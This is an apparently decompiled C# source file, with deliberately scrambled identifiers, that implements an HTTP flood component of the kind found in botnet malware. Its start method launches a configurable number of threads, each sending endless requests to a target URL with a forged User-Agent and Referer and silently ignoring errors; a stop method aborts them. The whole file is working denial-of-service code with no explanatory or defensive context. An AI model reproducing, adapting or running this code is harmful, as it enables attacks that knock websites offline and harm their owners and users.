using System;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class sMSaPuEFDIflsXkjzEGxXme
{
	private class zgykoOoztMJfCaSOaqGbPYv
	{
		private string sBqWRSQVGNUkLLaRTLkNrpX;

		private string MgXObmVUIIjrEgzfDVhVTNf;

		private string cyityvHYZuvFdKnDjpJRHmh;

		private WebClient iglWPXBcNdhjbBdIsocwnes;

		private int DlkYLlIUjQhUYxljdvsPlKQ;

		public zgykoOoztMJfCaSOaqGbPYv(string MXapLMWfaETmHZUJoxywCmg, int nRedtxBrRgYJqsOquJTnCob, string CYXzgykoOoztMJfCaSOaqGb, string PYvqUWDXckaGOPNSpwEiuuK)
		{
			iglWPXBcNdhjbBdIsocwnes = new WebClient();
			sBqWRSQVGNUkLLaRTLkNrpX = MXapLMWfaETmHZUJoxywCmg;
			DlkYLlIUjQhUYxljdvsPlKQ = nRedtxBrRgYJqsOquJTnCob;
			MgXObmVUIIjrEgzfDVhVTNf = CYXzgykoOoztMJfCaSOaqGb;
			cyityvHYZuvFdKnDjpJRHmh = PYvqUWDXckaGOPNSpwEiuuK;
		}

		public void Send()
		{
			while (true)
			{
				try
				{
					if (!MFMqRDTWZRpTxhdSmdUhraa)
					{
						iglWPXBcNdhjbBdIsocwnes.Headers.Add("GET: " + sBqWRSQVGNUkLLaRTLkNrpX + " HTTP/1.1");
					}
					else
					{
						iglWPXBcNdhjbBdIsocwnes.Headers.Add("POST: " + sBqWRSQVGNUkLLaRTLkNrpX + " HTTP/1.1");
					}
					iglWPXBcNdhjbBdIsocwnes.Headers.Add(HttpRequestHeader.UserAgent, MgXObmVUIIjrEgzfDVhVTNf);
					iglWPXBcNdhjbBdIsocwnes.Headers.Add(HttpRequestHeader.Referer, cyityvHYZuvFdKnDjpJRHmh);
					iglWPXBcNdhjbBdIsocwnes.DownloadString(sBqWRSQVGNUkLLaRTLkNrpX);
					Thread.Sleep(DlkYLlIUjQhUYxljdvsPlKQ);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(DlkYLlIUjQhUYxljdvsPlKQ);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static ThreadStart[] PwyTvBOLtHggIRdFZEcuUuG;

	private static Thread[] zSBYISYUgwMTVeCwacJPiqf;

	public static string LHHGLvCKaBzQGJBZDhfNCWM;

	public static string DRbKKwxYhtWpUsLXLICURoY;

	public static string iokwNOjluSzcsZfyHvcXXWb;

	public static bool MFMqRDTWZRpTxhdSmdUhraa;

	public static int OzbxKYGXJNnbYSkiFayFBNQ;

	public static bool eBCLVQtJbvPJyenomrcVcHU;

	private static zgykoOoztMJfCaSOaqGbPYv[] dtxBrRgYJqsOquJTnCobCYX;

	public static int qUWDXckaGOPNSpwEiuuKORI;

	public static void hwpZHKeHLZVFSrrTbnQjPmF()
	{
		checked
		{
			zSBYISYUgwMTVeCwacJPiqf = new Thread[qUWDXckaGOPNSpwEiuuKORI - 1 + 1];
			PwyTvBOLtHggIRdFZEcuUuG = new ThreadStart[qUWDXckaGOPNSpwEiuuKORI - 1 + 1];
			dtxBrRgYJqsOquJTnCobCYX = new zgykoOoztMJfCaSOaqGbPYv[qUWDXckaGOPNSpwEiuuKORI - 1 + 1];
			if (!LHHGLvCKaBzQGJBZDhfNCWM.StartsWith("http://"))
			{
				LHHGLvCKaBzQGJBZDhfNCWM = "http://" + LHHGLvCKaBzQGJBZDhfNCWM;
			}
			int num = qUWDXckaGOPNSpwEiuuKORI - 1;
			for (int i = 0; i <= num; i++)
			{
				dtxBrRgYJqsOquJTnCobCYX[i] = new zgykoOoztMJfCaSOaqGbPYv(LHHGLvCKaBzQGJBZDhfNCWM, OzbxKYGXJNnbYSkiFayFBNQ, DRbKKwxYhtWpUsLXLICURoY, iokwNOjluSzcsZfyHvcXXWb);
				PwyTvBOLtHggIRdFZEcuUuG[i] = dtxBrRgYJqsOquJTnCobCYX[i].Send;
				zSBYISYUgwMTVeCwacJPiqf[i] = new Thread(PwyTvBOLtHggIRdFZEcuUuG[i]);
				zSBYISYUgwMTVeCwacJPiqf[i].Start();
			}
			eBCLVQtJbvPJyenomrcVcHU = true;
		}
	}

	public static void eFQKcMiSdieqIWefoNHkmTZ()
	{
		checked
		{
			int num = qUWDXckaGOPNSpwEiuuKORI - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					zSBYISYUgwMTVeCwacJPiqf[i].Abort();
					zSBYISYUgwMTVeCwacJPiqf[i] = null;
					PwyTvBOLtHggIRdFZEcuUuG[i] = null;
					dtxBrRgYJqsOquJTnCobCYX[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			eBCLVQtJbvPJyenomrcVcHU = false;
		}
	}
}
